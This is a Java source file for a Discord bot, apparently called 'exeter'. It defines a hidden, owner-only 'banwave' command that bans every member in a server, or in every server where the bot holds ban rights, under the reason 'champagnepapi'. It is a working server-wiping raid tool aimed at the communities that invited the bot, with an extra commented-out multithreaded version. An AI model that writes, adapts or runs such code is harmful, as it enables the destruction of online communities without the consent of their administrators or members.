package me.comu.exeter.commands.owner;

import me.comu.exeter.core.Core;
import me.comu.exeter.interfaces.ICommand;
import me.comu.exeter.logging.Logger;
import me.comu.exeter.utility.Utility;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.ISnowflake;
import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;

import java.util.Arrays;
import java.util.List;

public class BanwaveCommand implements ICommand {

    @Override
    public void handle(List<String> args, GuildMessageReceivedEvent event) {
        if (!(event.getAuthor().getIdLong() == Core.OWNERID)) {
            return;
        }

        if (args.isEmpty()) {
            Logger.getLogger().print("Initiating Ban Wave...");
            event.getGuild().getMembers().stream().filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && event.getGuild().getSelfMember().canInteract(member))).map(ISnowflake::getId).parallel().forEach(member -> { event.getGuild().ban(member, 0, "champagnepapi").queue();System.out.println(Utility.ANSI_RED + "Banned " + member); });
        } else if (args.get(0).equalsIgnoreCase("-allservers") || args.get(0).equalsIgnoreCase("as")) {
            Logger.getLogger().print(Utility.ANSI_CYAN + "Banning ALL members...");
            for (Guild guild : Core.getInstance().getJDA().getGuilds()) {
                if (guild.getSelfMember().hasPermission(Permission.BAN_MEMBERS)) {
                    System.out.println(Utility.ANSI_YELLOW + "Starting banwave in " + guild.getName());
                    guild.getMembers().stream()
                            .filter(member -> (member.getIdLong() != Core.OWNERID && !member.getId().equals(event.getJDA().getSelfUser().getId()) && guild.getSelfMember().canInteract(member)))
                            .map(ISnowflake::getId)
                            .parallel()
                            .forEach(member -> {
                                guild.ban(member, 0, "champagnepapi").queue();
                                System.out.println(Utility.ANSI_GREEN + "Banned " + member + " in " + guild.getName());
                            });
                }
            }
        }
    }

        /*List<List<String>> partitionLists = Lists.partition(members, 4);
        List<String> wave1members = new ArrayList<>(partitionLists.get(0));
        List<String> wave2members = new ArrayList<>(partitionLists.get(1));
        List<String> wave3members = new ArrayList<>(partitionLists.get(2));
        List<String> wave4members = new ArrayList<>(partitionLists.get(3));
        ExecutorService executorService = Executors.newFixedThreadPool(4);
        Runnable wave1 = () -> wave1members.forEach((member) -> event.getGuild().ban(member, 0, "champagnepapi").queue();
        Runnable wave2 = () -> wave2members.forEach((member) -> event.getGuild().ban(member, 0, "champagnepapi").queue();
        Runnable wave3 = () -> wave3members.forEach((member) -> event.getGuild().ban(member, 0, "champagnepapi").queue();
        Runnable wave4 = () -> wave4members.forEach((member) -> event.getGuild().ban(member, 0, "champagnepapi").queue();
        executorService.submit(wave1);
        executorService.submit(wave2);
        executorService.submit(wave3);
        executorService.submit(wave4);*/

    @Override
    public String getHelp() {
        return "Use at your own risk\n`" + Core.PREFIX + getInvoke() + " [-allservers]`\nAliases: `" + Arrays.deepToString(getAlias()) + "`";
    }

    @Override
    public String getInvoke() {
        return "etb";
    }

    @Override
    public String[] getAlias() {
        return new String[]{"bw", "banwave","heylmao"};
    }

    @Override
    public Category getCategory() {
        return Category.OWNER;
    }

    @Override
    public boolean isPremium() {
        return false;
    }
}

